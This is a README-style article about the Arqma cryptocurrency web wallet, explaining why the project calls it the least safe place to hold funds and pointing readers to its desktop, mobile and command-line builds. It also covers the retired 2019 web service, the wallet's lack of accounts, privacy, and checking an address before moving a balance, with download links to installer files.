![Arqma Wallet](assets/banner-article.png)

<h1 align="center">The Arqma web wallet, and why the project points elsewhere</h1>

<p align="center">What the old web wallet was, why it closed and where those coins sit.</p>

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="assets/button-windows.png"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="assets/platform-windows.png"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

A web wallet exists, and the project's own position is that it is the least safe surface for holding funds: the site advises against keeping meaningful amounts in it. The desktop and mobile builds are the surfaces the project ships for ordinary use, and an older web wallet service has not operated since 2019.

## What a web wallet is

It is a wallet that runs in a browser tab rather than as an installed application. The keys are handled by the page, and the page is delivered fresh every time it is loaded.

That is the structural difference from the desktop and mobile builds, where the application is installed on the machine and the wallet file sits in a known folder. With a web wallet there is no such file on disk by default, and the browser session is the whole of the environment.

## The project's stated position

The project says what it thinks of this surface in one line: the web wallet exists, and it is the least safe place to hold funds, with the site advising against keeping meaningful amounts in it.

That is not a hedge, and it is worth taking at face value rather than reading as modesty. The same project ships a desktop wallet, command-line binaries and two native mobile apps, and it points at those for anything that matters.

## The older service

A previous web wallet at its own subdomain has not operated since 2019. That is recorded here because the address still circulates in old guides and posts, and a reader who follows one of those links is following a service that is not running.

The practical consequence is that any instruction which begins from that old address is stale, whatever it says about how to use the site.

## Why the least safe surface is the one with the most to lose

Holding keys in a browser means the keys exist wherever the browser's context exists: in a tab, in the memory of a machine that is also browsing everything else, and behind whatever extensions are installed.

An installed wallet narrows that. The file sits in a fixed per-user folder, encrypted with a password, and the application that opens it is a known build from a published release with checksums and signatures.

That is the comparison the project is making when it calls the web wallet the least safe surface, and it is a comparison about where keys live rather than about who wrote the page.

## What the builds offer instead

The desktop GUI covers Windows, macOS and Linux, with the macOS build signed and notarized. The mobile apps cover Android and iOS. The command-line binaries cover the case where there is no desktop session at all.

The current release from the [Arqma Wallet v0.5.1.2 release](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2) ships all of them, and they share one seed and one wallet format, so a wallet started anywhere can be rebuilt anywhere else. That portability is what makes the choice of surface a choice about safety rather than about lock-in. [which Arqma Wallet build is current](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-which-build-is-current.md) covers how to identify the current build.

## What a web wallet does not change

The chain does not know which surface signed a transfer. A send is final, the address format is the same 95 characters beginning with `ar`, and the record is public either way.

So a web wallet is not a different kind of wallet in protocol terms. What differs is the environment the keys sit in, which is the whole of the argument.

## Accounts and identity

The wallet software has no account model: no email, no KYC step, no login owned by the project. That is true of every surface the project ships, and it is the reason there is nothing to recover if access is lost.

A web page that asks for an account is doing something the software does not require, and that difference is worth noticing. [Arqma wallet scam guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-scams-fake-support.md) covers the requests that arrive dressed as support.

## The privacy angle

Chain-level privacy comes from the protocol: ring signatures, one-time stealth addresses and RingCT, with view keys for selective disclosure. Those apply to a transfer regardless of which application signed it.

Network-level privacy is a different question, and it depends on the node the wallet talks to. A local node is the only setup where no third party sees network activity, and a browser tab is not that setup. [Arqma Wallet privacy guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-privacy-anonymity.md) covers the split between the two.

## What to do with an existing web wallet

If a balance is sitting in one, the project's own guidance is the answer: meaningful amounts do not belong there, and the surfaces designed for holding funds are the desktop and mobile builds.

Moving a balance means sending it, and a send is final. The destination address is the thing to check before signing, at full length and against the source. [Arqma Wallet address format](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-address-format.md) covers what a valid address looks like and why a partial one is not an address at all.

## Where the record lives afterwards

On the chain, permanently, visible through the explorer. Nothing about a web wallet changes that, and nothing about moving to a desktop wallet hides what already happened.

That is worth stating without alarm: the transfer is public either way, and the choice of surface is about who can move the funds next. [Arqma remote node safety](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-remote-node-safety.md) covers who can see the connection while that happens.

## FAQ

### Is there an Arqma web wallet?

Yes, and the project describes it as the least safe surface, advising against holding meaningful amounts in it.

### Should I use it for a large balance?

The project's own guidance says no: meaningful amounts belong on the desktop or mobile builds.

### What happened to the old web wallet address?

The older service at its own subdomain has not operated since 2019, and old links to it are stale.

### Does a web wallet change how transfers work?

No. Sends are final and the record is public regardless of which surface signed.

### Which build should I use instead?

The desktop GUI, the mobile apps or the command-line binaries, all of which share one seed format.

---

## Download Arqma Wallet

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="assets/button-windows.png"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="assets/platform-windows.png"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

---

## Related Arqma Wallet guides

| Guide | What it answers |
| --- | --- |
| [Arqma Wallet download and verify](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-download-and-verify.md) | Checking a downloaded installer against its published hash before you run it. |
| [Arqma Wallet privacy guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-privacy-anonymity.md) | What the chain reveals, what the node sees, and where KYC enters. |
| [Arqma project status](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-project-status.md) | How to confirm the network is live from GitHub, the explorer and the chain. |
